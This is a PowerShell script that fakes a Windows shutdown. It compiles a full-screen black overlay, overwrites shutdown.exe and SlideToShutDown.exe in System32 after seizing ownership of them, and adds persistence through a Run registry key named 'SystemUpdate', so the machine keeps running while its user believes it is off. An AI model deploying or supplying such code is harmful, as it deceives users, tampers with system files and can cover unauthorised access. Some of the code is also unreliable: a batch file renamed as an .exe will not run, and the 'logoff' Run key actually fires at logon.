# Simple fake shutdown - Creates black screen overlay when shutdown is attempted

# Create the black screen program
$blackScreenExe = @'
using System;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;

public class BlackScreen : Form
{
    [DllImport("user32.dll")]
    static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
    
    const int SC_MONITORPOWER = 0xF170;
    const int WM_SYSCOMMAND = 0x0112;
    
    public BlackScreen()
    {
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.BackColor = Color.Black;
        this.ShowInTaskbar = false;
        this.Cursor = Cursors.Default;
        
        // Cover all screens
        Rectangle bounds = Screen.AllScreens[0].Bounds;
        foreach (Screen screen in Screen.AllScreens)
        {
            bounds = Rectangle.Union(bounds, screen.Bounds);
        }
        this.Bounds = bounds;
        
        // Secret key combination to exit: Ctrl+Alt+Shift+F12
        this.KeyPreview = true;
        this.KeyDown += (s, e) => {
            if (e.Control && e.Alt && e.Shift && e.KeyCode == Keys.F12)
            {
                this.Close();
            }
        };
    }
    
    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new BlackScreen());
    }
}
'@

# Compile the black screen program
$blackScreenDir = "C:\ProgramData\SystemUpdate"
if (-not (Test-Path $blackScreenDir)) {
    New-Item -ItemType Directory -Path $blackScreenDir -Force | Out-Null
}

$blackScreenCs = "$blackScreenDir\BlackScreen.cs"
$blackScreenExePath = "$blackScreenDir\BlackScreen.exe"
$blackScreenExe | Out-File -FilePath $blackScreenCs -Encoding UTF8

Add-Type -TypeDefinition "using System;using System.CodeDom.Compiler;using Microsoft.CSharp;" -Language CSharp
$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.GenerateExecutable = $true
$params.OutputAssembly = $blackScreenExePath
$params.ReferencedAssemblies.Add("System.Windows.Forms.dll")
$params.ReferencedAssemblies.Add("System.Drawing.dll")
$params.CompilerOptions = "/target:winexe"
$results = $compiler.CompileAssemblyFromFile($params, $blackScreenCs)

if ($results.Errors.Count -eq 0) {
    Write-Output "Black screen program compiled successfully!"
} else {
    Write-Output "Compilation errors:"
    $results.Errors | ForEach-Object { Write-Output $_.ToString() }
}

# Create batch file to replace shutdown command
$fakeShutdownBat = "$blackScreenDir\fake-shutdown.bat"
$fakeShutdownContent = @"
@echo off
start "" "$blackScreenExePath"
exit
"@
$fakeShutdownContent | Out-File -FilePath $fakeShutdownBat -Encoding ASCII

# Backup and replace shutdown.exe
$systemRoot = $env:SystemRoot
$shutdownExe = "$systemRoot\System32\shutdown.exe"
$shutdownBackup = "$systemRoot\System32\shutdown.exe.bak"

if (-not (Test-Path $shutdownBackup)) {
    takeown /f $shutdownExe 2>$null | Out-Null
    icacls $shutdownExe /grant Administrators:F 2>$null | Out-Null
    Copy-Item $shutdownExe $shutdownBackup -Force
}

# Replace shutdown.exe with our batch file (rename batch to exe)
Copy-Item $fakeShutdownBat "$systemRoot\System32\shutdown.exe" -Force

# Also override SlideToShutDown.exe
$slideShutdown = "$systemRoot\System32\SlideToShutDown.exe"
$slideBackup = "$systemRoot\System32\SlideToShutDown.exe.bak"

if (-not (Test-Path $slideBackup) -and (Test-Path $slideShutdown)) {
    takeown /f $slideShutdown 2>$null | Out-Null
    icacls $slideShutdown /grant Administrators:F 2>$null | Out-Null
    Copy-Item $slideShutdown $slideBackup -Force
    Copy-Item $fakeShutdownBat $slideShutdown -Force
}

# Add registry key to run black screen on logoff attempt
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name "SystemUpdate" -Value "$blackScreenExePath" -ErrorAction SilentlyContinue

Write-Output "Fake shutdown enabled!"
Write-Output "When user clicks shutdown/logoff, black screen will appear instead."
Write-Output "System remains running. Press Ctrl+Alt+Shift+F12 to exit black screen."
Write-Output "Run revert-fake-shutdown.ps1 to restore normal behavior."
